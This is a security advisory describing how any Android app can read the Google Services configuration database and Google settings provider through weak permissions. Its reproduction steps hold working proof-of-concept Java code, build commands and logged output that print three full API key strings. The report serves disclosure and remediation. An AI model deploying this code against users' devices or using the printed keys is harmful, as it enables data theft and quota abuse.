# Google Services Framework — Configuration Database Information Disclosure via Weak Permission Controls

## Summary

Any third-party Android app can extract the entire GServices configuration database (1404+ entries) — including Google API keys, internal service URLs, certificate hashes, and authentication configuration — by declaring the `READ_GSERVICES` permission, which has `protectionLevel=normal` and is auto-granted at install time with no user prompt.

Additionally, the `GoogleSettingsProvider` (`content://com.google.settings/partner`) has **no readPermission** set at all — any app can query it without declaring any permission, leaking 18 configuration entries including user privacy settings (`network_location_opt_in`, `use_location_for_services`).

## Attack Scenario

**Attacker**: A developer who publishes a seemingly benign app (e.g., a calculator, wallpaper, or game) on Google Play.

**Victim**: Any user who installs the attacker's app on their Android device.

**What each party does**:

1. **Attacker** adds one line to their app's `AndroidManifest.xml`:
   ```xml
   <uses-permission android:name="com.google.android.providers.gsf.permission.READ_GSERVICES" />
   ```
2. **Victim** installs the app from Google Play. The `READ_GSERVICES` permission is `protectionLevel=normal`, so it is auto-granted at install — the user sees **no prompt**, **no dialog**, **no indication** that this permission was granted.
3. **Attacker's app**, on any launch or background execution, silently queries the GServices content provider and exfiltrates 1404 configuration entries including:
   - **3 Google API keys** (copresence, timezone, TTS)
   - **86 internal Google service URLs/endpoints**
   - **10 certificate hashes**
   - **68 authentication/token configuration values**
   - Device identity digest hash

The attacker never needs ADB, root, or any special device state. The attack works on a fully locked-down, non-rooted consumer device.

## Security Impact

**Confidentiality impact on user data and Google infrastructure:**

1. **API Key Theft**: The 3 leaked API keys (`AIzaSy...`) can be used by the attacker to make API calls billed against Google's infrastructure — quota theft at scale if harvested from many devices.

2. **Infrastructure Reconnaissance**: 86 internal URLs expose Google's service topology (upload endpoints, reporting URLs, update servers). An attacker can map Google's internal service architecture from leaked config.

3. **Certificate Intelligence**: 10 certificate/signing hashes provide useful information for targeted MitM planning.

4. **Auth Config Exposure**: 68 auth/token configuration entries reveal OAuth parameters, token lifetimes, and authentication flow details that aid in account compromise or session hijacking attacks.

5. **Scale**: Affects **every Android device** with Google Services Framework installed — billions of devices. The permission is declared by GSF which ships on all Google-certified devices.

## Reproduction Steps

### Prerequisites
- Android Studio or the Android SDK (for building a minimal APK)
- Any Android device with Google Play Services (tested on Pixel 6a, Android 17, June 2026 security patch)

### Step-by-step

**Step 1: Create a minimal Android app**

`AndroidManifest.xml`:
```xml
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.example.gservicespoc">
    <uses-sdk android:minSdkVersion="28" android:targetSdkVersion="34" />
    <uses-permission android:name="com.google.android.providers.gsf.permission.READ_GSERVICES" />
    <application android:label="GServices PoC">
        <activity android:name=".MainActivity" android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>
    </application>
</manifest>
```

`MainActivity.java`:
```java
package com.example.gservicespoc;

import android.app.Activity;
import android.content.ContentResolver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;

public class MainActivity extends Activity {
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        ContentResolver cr = getContentResolver();

        // Extract ALL GServices entries using prefix query with empty selectionArgs
        Cursor c = cr.query(
            Uri.parse("content://com.google.android.gsf.gservices/prefix"),
            null, null, new String[]{""}, null);

        if (c != null) {
            Log.d("GSERVICES_POC", "Total entries extracted: " + c.getCount());

            while (c.moveToNext()) {
                String key = c.getString(0);
                String value = c.getString(1);

                // Flag API keys
                if (value != null && value.startsWith("AIzaSy")) {
                    Log.d("GSERVICES_POC", "API KEY FOUND: " + key + " = " + value);
                }

                // Flag URLs
                if (value != null && (value.startsWith("https://") || value.startsWith("http://"))) {
                    Log.d("GSERVICES_POC", "URL FOUND: " + key + " = " + value);
                }
            }
            c.close();
        }
    }
}
```

**Step 2: Build and install the APK**

```bash
# Build using standard Android SDK tools
javac -cp $ANDROID_SDK/platforms/android-35/android.jar -d build/classes MainActivity.java
d8 --min-api 28 --output build/ build/classes/com/example/gservicespoc/*.class
aapt package -f -M AndroidManifest.xml -I $ANDROID_SDK/platforms/android-35/android.jar -F build/app.apk
cd build && aapt add app.apk classes.dex && cd ..
zipalign -f 4 build/app.apk build/app-aligned.apk
apksigner sign --ks debug.keystore build/app-aligned.apk
adb install build/app-aligned.apk
```

**Step 3: Run and observe**

```bash
adb shell am start -n com.example.gservicespoc/.MainActivity
adb logcat -s GSERVICES_POC
```

**Expected output** (actual output from Pixel 6a):
```
D GSERVICES_POC: Total entries extracted: 1404
D GSERVICES_POC: API KEY FOUND: copresence:api_key = AIzaSyB11LJUdYyY6pjP2NlPPT1pHcxAflWksnc
D GSERVICES_POC: API KEY FOUND: deskclock:timezone_api_key = AIzaSyBUcCPilPlw0sWDaXdmNScHS4N0jm31D-I
D GSERVICES_POC: API KEY FOUND: googletts:v2_api_key = AIzaSyA33f9cSqKdR-V4XNkZNZ_rh_dbT1VQJFo
D GSERVICES_POC: URL FOUND: car:url:query = https://www.googleapis.com/...
D GSERVICES_POC: URL FOUND: url:usage_reporting_upload_url = https://...
... (86 total URLs, 10 certs, 68 auth configs)
```

**Step 4: Verify the permission was auto-granted (no user prompt)**

```bash
adb shell dumpsys package com.example.gservicespoc | grep READ_GSERVICES
# Output: com.google.android.providers.gsf.permission.READ_GSERVICES: granted=true
```

**Step 5: Verify shell CANNOT access it (proving it's permission-gated)**

```bash
adb shell content query --uri "content://com.google.android.gsf.gservices/prefix" --arg ""
# Output: SecurityException: requires com.google.android.providers.gsf.permission.READ_GSERVICES
```

This proves the content provider IS permission-gated, but the gate is a `normal` permission that any app gets automatically.

**Step 6: Query GoogleSettingsProvider (NO permission needed)**

Add to `MainActivity.java`:
```java
// No permission declaration needed in manifest!
Cursor c2 = cr.query(
    Uri.parse("content://com.google.settings/partner"),
    null, null, null, null);
if (c2 != null) {
    Log.d("GSERVICES_POC", "Google Settings: " + c2.getCount() + " rows");
    while (c2.moveToNext()) {
        Log.d("GSERVICES_POC", c2.getString(1) + " = " + c2.getString(2));
    }
    c2.close();
}
```

**Expected output:**
```
D GSERVICES_POC: Google Settings: 18 rows
D GSERVICES_POC: network_location_opt_in = 1
D GSERVICES_POC: use_location_for_services = 1
D GSERVICES_POC: client_id = android-google
D GSERVICES_POC: search_client_id = ms-android-google
... (18 total rows)
```

## Root Cause

### Issue 1: GServices — Normal permission gates sensitive data

The `READ_GSERVICES` permission is defined in `com.google.android.gsf` with `protectionLevel=normal`:

```
Permission [com.google.android.providers.gsf.permission.READ_GSERVICES]:
    sourcePackage=com.google.android.gsf
    prot=normal
```

The `GservicesProvider.query()` method (decompiled from GSF APK) serves all 1404+ entries when called with an empty `selectionArgs` prefix. The provider stores these in a `TreeMap` and uses `subMap()` for prefix matching — an empty prefix returns everything.

### Issue 2: GoogleSettingsProvider — No readPermission at all

The `GoogleSettingsProvider` (authority: `com.google.settings`) is declared in the manifest with `writePermission` (signature) but **no `readPermission`**:

```xml
<!-- From decompiled AndroidManifest.xml -->
<provider android:name="GoogleSettingsProvider"
    android:writePermission="com.google.android.providers.settings.permission.WRITE_GSETTINGS"
    android:exported="true"
    android:authorities="com.google.settings; com.google.android.gmscore.providersettings.do.not.use">
    <!-- NOTE: no android:readPermission -->
</provider>
```

The `query()` method in `GoogleSettingsProvider.java` contains no permission check — only `checkWritePermissions()` is called from write methods. Any app can read all 18 partner settings rows including the user's `network_location_opt_in` preference.

## Tested On

- **Device**: Google Pixel 6a (bluejay)
- **OS**: Android 17 (CP31.260608.007)  
- **Security Patch Level**: 2026-06-05
- **Google Services Framework**: com.google.android.gsf (latest from device)
- **Google Play Services**: com.google.android.gms (latest)

## Suggested Fix

### GServicesProvider
1. **Change `READ_GSERVICES` protection level** from `normal` to `signature|privileged` — only Google-signed system apps should access the GServices configuration database.
2. **Filter sensitive entries**: API keys, certificate hashes, and auth tokens should not be exposed through the content provider at any permission level.
3. **Add caller package validation**: Restrict `GservicesProvider.query()` to known Google package UIDs.

### GoogleSettingsProvider
4. **Add `android:readPermission`** to the provider declaration — use `READ_GSETTINGS` (already defined at `signature` level but not applied to the provider).
5. **Deprecate the `com.google.settings` legacy authority** — it is exported and bypasses the protection on the `do.not.use` authority name.

## Classification

- **CWE**: CWE-276 (Incorrect Default Permissions) — GServices normal permission
- **CWE**: CWE-862 (Missing Authorization) — GoogleSettingsProvider has no readPermission
- **CVSS 3.1**: 5.5 (Medium) — AV:L/AC:L/PR:N/UI:R/S:U/C:H/I:N/A:N
- **Impact**: Confidentiality — mass disclosure of internal configuration including API keys and user privacy settings
